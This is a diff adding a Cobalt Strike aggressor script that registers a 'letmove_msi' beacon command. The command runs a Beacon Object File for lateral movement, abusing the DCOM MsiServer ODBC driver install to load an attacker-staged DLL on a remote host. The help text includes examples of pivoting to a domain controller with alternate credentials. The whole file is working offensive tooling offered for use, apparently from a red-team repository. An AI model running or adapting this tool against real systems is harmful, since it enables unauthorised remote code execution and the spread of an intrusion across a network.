@@ -1,0 +1,107 @@
+# letmove_msi.cna
+# Cobalt Strike aggressor script for the LetMoveMSI BoF.
+# Repository: https://github.com/300squarefeet/LetMoveMSI
+#
+# Load into Cobalt Strike:  Cobalt Strike > Script Manager > Load...
+# The BoF objects are looked up relative to this script:
+#   dist/letmove_msi.x64.o
+#   dist/letmove_msi.x86.o
+# ...with a fallback to bof/out/ for source builds.
+
+sub _lm_bof_path {
+    local('$arch $c');
+    $arch = $1;
+    foreach $c (@(
+        script_resource("dist/letmove_msi." . $arch . ".o"),
+        script_resource("bof/out/letmove_msi." . $arch . ".o"))) {
+        if (-exists $c) { return $c; }
+    }
+    return $null;
+}
+
+sub _lm_read {
+    local('$path $h $data');
+    $path = $1;
+    $h = openf($path);
+    if ($h is $null) { return $null; }
+    $data = readb($h, -1);
+    closef($h);
+    return $data;
+}
+
+alias letmove_msi {
+    local('$bid $mode $host $domain $user $pass $driver $dll $arch $path $data $args');
+    $bid = $1;
+
+    if (size(@_) != 8) {
+        berror($bid, "usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>");
+        berror($bid, "pass \"\" for unused fields. see 'help letmove_msi' for details.");
+        return;
+    }
+
+    $mode   = $2; $host   = $3; $domain = $4; $user = $5;
+    $pass   = $6; $driver = $7; $dll    = $8;
+
+    if ($mode ne "local" && $mode ne "remote") {
+        berror($bid, "mode must be 'local' or 'remote'"); return;
+    }
+    if ($mode eq "remote" && $host eq "") {
+        berror($bid, "remote mode requires <host>"); return;
+    }
+    if (($user ne "" && $pass eq "") || ($user eq "" && $pass ne "")) {
+        berror($bid, "<user> and <pass> must be provided together"); return;
+    }
+    if ($domain ne "" && $user eq "") {
+        berror($bid, "<domain> requires <user> and <pass>"); return;
+    }
+    if ($driver eq "" || $dll eq "") {
+        berror($bid, "<driver> and <dll> are required"); return;
+    }
+
+    $arch = barch($bid);
+    $path = _lm_bof_path($arch);
+    if ($path is $null) {
+        berror($bid, "BoF not found for arch=" . $arch . ". Build with 'cargo make' or copy from dist/.");
+        return;
+    }
+
+    $data = _lm_read($path);
+    if ($data is $null) {
+        berror($bid, "failed to read " . $path); return;
+    }
+
+    $args = bof_pack($bid, "ZZZZZZZ", $mode, $host, $domain, $user, $pass, $driver, $dll);
+
+    if ($mode eq "remote") {
+        btask($bid, "letmove_msi: pivoting to " . $host . " (driver=" . $driver . ")");
+    } else {
+        btask($bid, "letmove_msi: local install (driver=" . $driver . ")");
+    }
+
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "letmove_msi",
+    "DCOM MsiServer lateral movement via ODBC driver install",
+    "Synopsis:\n" .
+    "    letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>\n\n" .
+    "Arguments (all seven positional, pass \"\" for absent fields):\n" .
+    "    mode    'local' or 'remote'\n" .
+    "    host    target hostname; required for remote, \"\" for local\n" .
+    "    domain  alternate credential domain; \"\" to run as caller\n" .
+    "    user    alternate credential username; \"\" to run as caller\n" .
+    "    pass    alternate credential password; \"\" to run as caller\n" .
+    "    driver  ODBC driver name to register (arbitrary)\n" .
+    "    dll     absolute path to the Setup DLL on the TARGET machine.\n" .
+    "            Stage odbcpivot.dll (from the LetMoveMSI dist/) there first,\n" .
+    "            or use your own DLL that exports ConfigDriver.\n\n" .
+    "Examples:\n" .
+    "    letmove_msi local \"\" \"\" \"\" \"\" LMPivot C:\\Windows\\Temp\\odbcpivot.dll\n" .
+    "    letmove_msi remote DC01 \"\" \"\" \"\" LMPivot C:\\Windows\\Temp\\odbcpivot.dll\n" .
+    "    letmove_msi remote DC01 CORP svc-admin P4ss! LMPivot C:\\Windows\\Temp\\odbcpivot.dll\n\n" .
+    "Notes:\n" .
+    "    - Architecture is chosen automatically from the beacon's arch.\n" .
+    "    - BoF objects are read from dist/ (release), or bof/out/ (source build).\n" .
+    "    - The target must be able to write into the ODBC installer directory.\n"
+);
